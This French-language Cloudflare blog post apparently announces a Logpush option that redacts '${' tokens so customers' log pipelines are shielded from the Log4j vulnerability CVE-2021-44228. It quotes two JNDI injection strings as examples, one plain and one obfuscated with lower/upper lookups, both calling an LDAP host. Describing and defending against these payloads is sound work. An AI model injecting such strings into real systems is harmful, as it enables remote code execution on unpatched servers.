<div class="mb2 gray5">2 min read</div>
<div class="post-content lh-copy gray1">
	<p>Le 9 décembre 2021, le monde a appris l'existence de <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">CVE-2021-44228</a>, une exploitation de vulnérabilité Zero Day affectant l'utilitaire <a href="https://logging.apache.org/log4j/2.x/index.html">Apache Log4j</a>. Cloudflare a immédiatement <a href="https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation">mis à jour son pare-feu WAF</a> pour contribuer à établir une protection contre cette vulnérabilité, mais nous recommandons à nos clients de mettre à jour leurs systèmes le plus rapidement possible.</p>
	<p>Cependant, nous savons que de nombreux clients de Cloudflare consomment leurs fichiers journaux dans un logiciel qui utilise Log4j. Nous atténuons donc également toute tentative d'exploitation de la vulnérabilité via les fichiers journaux Cloudflare. Au moment de cette publication, nous observons jusqu'à 1000 fois par seconde le modèle d'exploitation de la vulnérabilité dans les fichiers journaux que nous transmettons aux clients.</p>
	<p>Dès maintenant, les clients peuvent mettre à jour leurs tâches Logpush afin d'expurger automatiquement les jetons susceptibles de déclencher cette vulnérabilité. Vous pouvez en apprendre davantage à ce sujet dans notre <a href="https://developers.cloudflare.com/logs/reference/logpush-api-configuration#options">documentation pour développeurs</a> ou consulter les détails ci-dessous.</p>
	<h3 id="comment-fonctionne-l-attaque">Comment fonctionne l'attaque</h3>
	<p>Vous pouvez en apprendre davantage plus sur le fonctionnement de la vulnérabilité de Log4j dans <a href="https://blog.cloudflare.com/fr-fr/inside-the-log4j2-vulnerability-cve-2021-44228-fr-fr">notre publication de blog</a>. En résumé, l'auteur d'une attaque peut ajouter une expression comme <code>${jndi:ldap://exemple.com/a}</code> dans n'importe quelle chaîne. Log4j établit alors une connexion sur Internet pour récupérer cet objet.</p>
	<p>Les fichiers journaux Cloudflare contiennent de nombreux champs de chaînes contrôlés par les utilisateurs finaux sur l'Internet public, comme User Agent et le chemin d'URL. Avec cette vulnérabilité, il est possible qu'un utilisateur malveillant puisse provoquer une exécution de code à distance sur tout système lisant ces champs et utilisant une instance non corrigée de Log4j.</p>
	<h3 id="notre-plan-d-att-nuation">Notre plan d'atténuation</h3>
	<p>Malheureusement, la simple recherche d'un jeton comme <code>${jndi:ldap</code> n'est pas suffisante pour offrir une protection contre cette vulnérabilité. En raison de l'expressivité du langage de modélisation, il est nécessaire de rechercher également les variantes masquées. Nous observons déjà des auteurs d'attaques qui utilisent des variantes comme <code>${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}</code>. Ainsi, l'expurgation du jeton ${ est le moyen le plus général de se défendre contre cette vulnérabilité.</p>
	<p>Le jeton <code>${</code> apparaît jusqu'à 1000 fois par seconde dans les journaux que nous transmettons actuellement aux clients. Une vérification ponctuelle de certains enregistrements montre que beaucoup ne sont <em>pas</em> des tentatives d'exploitation de cette vulnérabilité. Par conséquent, nous ne pouvons pas expurger nos journaux en toute sécurité sans affecter les clients qui s'attendent à voir ce jeton dans leurs journaux.</p>
	<p>Dès maintenant, les clients peuvent mettre à jour leurs tâches Logpush pour expurger la chaîne <code>${</code> et la remplacer systématiquement par <code>x{</code>.</p>
	<p>Pour cela, les clients peuvent mettre à jour la configuration des options de leur tâche Logpush pour inclure le paramètre <code>CVE-2021-44228=true</code>. Pour des instructions détaillées sur la marche à suivre avec l'API Logpush, consultez l'exemple fourni dans <a href="https://developers.cloudflare.com/logs/reference/logpush-api-configuration/examples/example-logpush-curl#step-6---updating-logpull_options">notre documentation pour développeurs</a>. Veuillez noter que cette option n'est actuellement pas disponible dans le tableau de bord Cloudflare et qu'elle peut uniquement être modifiée avec l'API.</p>
</div>